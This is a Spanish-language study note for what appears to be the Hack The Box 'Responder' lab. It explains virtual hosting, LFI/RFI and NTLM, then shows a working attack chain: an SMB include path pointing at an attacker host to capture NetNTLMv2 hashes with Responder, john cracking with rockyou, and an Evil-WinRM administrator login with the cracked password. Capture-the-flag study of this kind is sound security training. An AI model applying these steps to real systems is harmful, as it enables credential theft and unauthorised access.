Name-Based Virtual Hosting

En el mundo de los sitios web, funciona así:

Tu navegador (tú, enviando una carta) quiere visitar unika.htb.

Primero, tu computadora necesita saber la dirección IP de unika.htb. Normalmente, esto lo hace un servidor DNS.

El problema: Si el servidor DNS no conoce unika.htb (porque es un dominio local o específico de un laboratorio, como en este caso), tu navegador no sabrá a qué IP conectarse. Es como si el cartero no supiera la dirección del edificio. Por eso, al principio, el navegador te dice "Hmm. We're having trouble finding that site.".

La solución: /etc/hosts: Este archivo en tu computadora es como tu propia "agenda de direcciones personal". Puedes decirle a tu computadora: "Oye, cada vez que alguien pregunte por unika.htb, envía esa solicitud a la IP 10.129.128.223 (la IP del servidor)". 


Al agregar 10.129.128.223 unika.htb a tu /etc/hosts, tu computadora ahora sabe a qué dirección IP ir cuando le pides unika.htb. 
El encabezado Host: Incluso después de que tu computadora sepa la IP, hay un paso adicional. Cuando tu navegador envía la solicitud HTTP al servidor (al "edificio"), incluye un "encabezado Host". Este encabezado le dice al servidor: "Hola, me estoy conectando a ti, pero estoy buscando específicamente el sitio para unika.htb." 

Virtual Hosting Basado en Nombres: El servidor web, al recibir esta solicitud, mira el encabezado Host. Si en ese servidor hay configurados varios sitios web (varios "apartamentos"), el servidor usa ese encabezado Host para saber cuál de todos los sitios alojados debe mostrarte. 

echo "10.129.128.223 unika.htb" | sudo tee -a /etc/hosts

File Inclusion Vulnerability
Inclusión Local de Archivos (LFI)
LFI o Local File Inclusion ocurre cuando un atacante logra que un sitio web incluya un archivo que no estaba destinado a ser una opción para la aplicación. Un ejemplo común es cuando una aplicación utiliza la ruta a un archivo como entrada. Si la aplicación trata esta entrada como confiable y no se realizan las comprobaciones de saneamiento requeridas en ella, el atacante puede explotarla utilizando la cadena ../ en el nombre de archivo de entrada y, finalmente, ver archivos sensibles en el sistema de archivos local. En algunos casos limitados, una LFI también puede conducir a la ejecución de código.

nclusión Remota de Archivos (RFI)
RFI o Remote File Inclusion es similar a LFI, pero en este caso es posible que un atacante cargue un archivo remoto en el host utilizando protocolos como HTTP, FTP, etc.

What is the include() method in PHP?
The include statement takes all the text/code/markup that exists in the specified file and loads it into the
memory, making it available for use.
For example:
A more detailed explanation about the include() method of PHP can be found here.

¿Qué es NTLM (New Technology LAN Manager)?
NTLM es una colección de protocolos de autenticación creados por Microsoft. Es un protocolo de autenticación de desafío-respuesta usado para autenticar un cliente a un recurso en un dominio de Active Directory.

Es un tipo de inicio de sesión único (SSO) porque permite al usuario proporcionar el factor de autenticación subyacente una sola vez, al iniciar sesión.

El proceso de autenticación NTLM se realiza de la siguiente manera:

El cliente se presenta: Tu computadora (el cliente) le dice al servidor "Hola, soy Lauti, y quiero acceder a este recurso". Envía tu nombre de usuario y el dominio al que perteneces.
El servidor te "desafía": El servidor no te pide la contraseña directamente. En su lugar, genera una cadena de caracteres aleatoria, como un acertijo, y te la envía. A esto se le llama el "desafío" (challenge).
El cliente responde al desafío: Tu computadora toma ese desafío, lo combina con un hash de tu contraseña (una versión cifrada de tu contraseña que solo tu sistema conoce y no se puede revertir fácilmente) y lo encripta. La "respuesta" resultante de esta operación es lo que envía de vuelta al servidor. Importante: ¡Nunca se envía la contraseña real!
El servidor verifica: El servidor también conoce (o puede obtener) el hash de tu contraseña. Toma el mismo desafío que te envió y, con el hash de tu contraseña que tiene registrado, realiza la misma operación criptográfica que hizo tu cliente.
Comparación y autenticación: Si el resultado que el servidor obtiene coincide exactamente con la "respuesta" que le enviaste, ¡bingo! Significa que tenías la contraseña correcta, y el servidor te autentica, dándote acceso al recurso.

Puedes encontrar una explicación más detallada del funcionamiento de la autenticación NTLM aquí.


NTLM vs. NTHash vs. NetNTLMv2
La terminología alrededor de la autenticación NTLM es complicada, e incluso los profesionales a veces la usan mal, así que vamos a definir algunos términos clave:

Una función hash es una función unidireccional que toma cualquier cantidad de datos y devuelve un valor de tamaño fijo. Típicamente, el resultado se conoce como hash, digest o huella digital. Se usan para almacenar contraseñas de forma más segura, ya que no hay forma de convertir el hash directamente de vuelta a los datos originales (aunque existen ataques para intentar recuperar contraseñas a partir de hashes, como veremos más adelante). Así, un servidor puede almacenar un hash de tu contraseña, y cuando la envías al sitio, este aplica un hash a tu entrada y compara el resultado con el hash en la base de datos. Si coinciden, el servidor sabe que proporcionaste la contraseña correcta.

Un NTHash es la salida del algoritmo usado para almacenar contraseñas en sistemas Windows, tanto en la base de datos SAM como en los controladores de dominio. Un NTHash a menudo se conoce como hash NTLM o incluso simplemente NTLM, lo cual es muy engañoso/confuso.

Cuando el protocolo NTLM quiere autenticarse a través de la red, usa un modelo de desafío/respuesta como el descrito anteriormente. Un desafío/respuesta NetNTLMv2 es una cadena formateada específicamente para incluir el desafío y la respuesta. A menudo se le conoce como hash NetNTLMv2, pero en realidad no es un hash. Aun así, se le llama regularmente hash porque lo atacamos de la misma manera. Verás que los objetos NetNTLMv2 se mencionan como NTLMv2, o incluso, confusamente, como NTLM.

El Contexto: PHP y sus Configuraciones de Seguridad
En un servidor web que utiliza PHP, existe un archivo de configuración llamado php.ini. Este archivo contiene directivas (ajustes) que controlan cómo se comporta PHP. Dos directivas importantes son:

allow_url_include: Por defecto, esta directiva está en Off (apagada). Cuando está On, permite que las funciones de inclusión de archivos de PHP (como include(), require(), include_once(), etc.) carguen archivos desde URLs remotas usando protocolos como HTTP o FTP. Si estuviera On y un atacante pudiera controlar el valor del parámetro que se incluye (como vimos en el ejemplo de LFI/RFI), podría hacer que el servidor web descargue y ejecute código malicioso desde un sitio remoto. Por eso, por defecto está Off, para prevenir ataques de inclusión de archivos remotos (RFI).
allow_url_fopen: También por defecto en Off. Esta directiva controla si las funciones de manipulación de archivos (como fopen(), file_get_contents(), etc.) pueden abrir URLs como si fueran archivos locales. Es un requisito previo para allow_url_include; si allow_url_fopen está Off, allow_url_include también lo estará.
El punto clave aquí es que PHP está diseñado para evitar que se carguen recursos remotos por HTTP o FTP si estas directivas están desactivadas, lo cual es una buena práctica de seguridad.

La Excepción Peligrosa: URLs SMB y NTLM
Sin embargo, el texto señala un punto crucial:

"However, even if allow_url_include and allow_url_fopen are set to 'Off', PHP will not prevent the loading of SMB URLs."

Aquí está la vulnerabilidad o, mejor dicho, el comportamiento inesperado. Aunque PHP se protege contra las inclusiones HTTP y FTP, no tiene la misma restricción para las URLs SMB (Server Message Block). SMB es un protocolo de red utilizado principalmente por Windows para compartir archivos, impresoras y comunicarse con otros dispositivos en una red local.

¿Qué significa esto?

Significa que si una aplicación PHP vulnerable tiene una inclusión de archivo (como un LFI que permite manipular la ruta del archivo), y aunque no pueda cargar un archivo malicioso desde http://atacante.com/malicious.php (porque allow_url_include está Off), sí podría intentar cargar un recurso desde una ruta SMB, por ejemplo:

\\TU_IP_ATACANTE\recurso_inexistente

El atacante configura Responder: El atacante (tú, en tu Kali Linux) utiliza una herramienta como Responder. Responder es una herramienta fantástica para ataques de hombre en el medio (MITM) que, entre otras cosas, puede simular varios servicios (como SMB, HTTP, FTP, etc.) en tu máquina de atacante y "escuchar" las peticiones de autenticación.

El servidor Windows "llama" al atacante vía SMB: Cuando la aplicación PHP vulnerable en el servidor Windows intenta "cargar" la URL SMB que le pasaste (por ejemplo, \\TU_IP_ATACANTE\cualquier_cosa), el sistema operativo Windows subyacente intenta conectarse al servidor SMB que está "escuchando" en tu máquina de atacante.

Proceso de autenticación NTLM: Durante este intento de conexión SMB, el cliente Windows (el servidor web vulnerable) iniciará un proceso de autenticación NTLM con tu máquina de atacante (que Responder está simulando).

Responder captura el NTLMv2 Hash: Como vimos en la explicación anterior, el proceso de autenticación NTLM envía un desafío y una respuesta (el NetNTLMv2 hash) que no es la contraseña en sí, pero sí un derivado criptográfico que puede ser capturado. Responder intercepta y registra este NetNTLMv2 hash.

El hash está capturado: Una vez que Responder ha capturado este hash, el atacante puede intentar crackearlo (romperlo) usando herramientas como Hashcat para recuperar la contraseña original del usuario bajo el cual se está ejecutando el servicio web en el servidor Windows.

La aplicación web NO tiene una contraseña SMB "incorporada"
La aplicación PHP que se está ejecutando en el servidor web no tiene un campo de configuración donde tú le digas "esta es la contraseña para usar SMB". En la mayoría de los casos de vulnerabilidad LFI/RFI que permiten la captura de hashes NTLMv2, lo que sucede es lo siguiente:

La aplicación web (PHP) simplemente intenta "acceder" a una ruta de archivo. Por ejemplo, cuando se le pasa page=\\TU_IP_ATACANTE\recurso_inexistente. PHP simplemente le dice al sistema operativo subyacente: "Necesito leer este archivo en esta ruta".

Windows toma el control de la conexión SMB. Es el sistema operativo Windows (donde está alojado el servidor web, digamos un IIS o Apache con PHP) el que interpreta esa ruta SMB como un intento de acceder a un recurso compartido de red. Cuando Windows intenta conectarse a un recurso SMB, automáticamente intentará autenticarse.

¿Con qué credenciales se autentica Windows?
Aquí está la clave: Windows se autenticará con las credenciales de la cuenta de usuario bajo la cual se está ejecutando el servicio web (o el proceso de PHP).

Cuentas de servicio: Muchos servicios web (como IIS o Apache) no se ejecutan directamente con la cuenta del administrador, sino con cuentas de servicio dedicadas (por ejemplo, NETWORK SERVICE, IIS APPPOOL\DefaultAppPool, o una cuenta de usuario específica que haya sido configurada).
Cuentas de usuario: En algunos casos, un administrador podría haber configurado el servidor web para que se ejecute bajo una cuenta de usuario de dominio o local específica.
Lo importante es que las credenciales que se enviarán (y de las que capturaremos el hash NTLMv2) serán las de la cuenta de usuario/servicio que el sistema operativo Windows está utilizando para ejecutar el proceso del servidor web o la aplicación PHP en ese momento.

¿Por qué no se necesita una contraseña por defecto en la aplicación web?
Porque no es la aplicación web la que hace la autenticación de forma explícita con un usuario y contraseña. Es el sistema operativo Windows subyacente el que, al intentar resolver la ruta SMB, inicia automáticamente el proceso de autenticación NTLM con las credenciales del contexto de seguridad en el que está operando el proceso que hizo la solicitud.

Esto hace que la captura de hashes sea tan potente: no necesitas saber si el desarrollador de la aplicación PHP configuró algo mal, sino que te aprovechas de cómo Windows maneja las conexiones SMB y la autenticación NTLM en su propio contexto.

Hash Cracking
john -w=/usr/share/wordlists/rockyou.txt hash.txt

We'll connect to the WinRM service on the target and try to get a session. Because PowerShell isn't installed
on Linux by default, we'll use a tool called Evil-WinRM which is made for this kind of scenario.
-w : wordlist to use for cracking the hash
john -w=/usr/share/wordlists/rockyou.txt hash.txt
password : badminton
evil-winrm -i 10.129.136.91 -u administrator -p badminton